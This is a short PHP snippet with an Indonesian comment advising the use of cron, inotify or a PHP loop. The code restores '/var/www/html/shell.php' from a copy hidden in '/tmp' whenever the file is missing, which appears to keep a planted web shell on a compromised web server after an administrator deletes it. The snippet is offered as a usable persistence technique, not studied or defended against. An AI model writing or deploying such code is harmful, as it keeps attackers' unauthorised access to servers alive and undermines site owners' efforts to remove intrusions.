<?php
$file = '/var/www/html/shell.php';
$backup = '/tmp/shell_backup.php';
if (!file_exists($file)) {
    copy($backup, $file);
}
?>

// Gunakan cron, inotify, atau loop sederhana dalam PHP.
